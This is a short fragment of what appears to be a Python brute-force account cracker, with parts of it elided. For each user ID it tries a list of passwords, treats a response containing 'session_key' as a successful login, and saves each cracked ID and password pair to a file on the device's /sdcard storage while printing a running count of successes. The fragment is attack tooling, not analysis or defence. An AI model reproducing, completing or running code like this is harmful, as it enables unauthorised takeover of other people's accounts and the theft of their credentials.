...
#    print(cox)
    print("  [✓] Id Save: /sdcard/SURCHY.txt")
    print("--------------------------------------------------------------")
#    print(cox)
...
def file_subb(uid,pwx):
    global oks,loop,cps
    sys.stdout.write(f"\r  \033[38;5;46m[SURCHY] {loop}|{str(len(oks))}");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r  [KG_BLACKOK] {uid} | {ps}      ")
                open("/sdcard/SURCHY-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
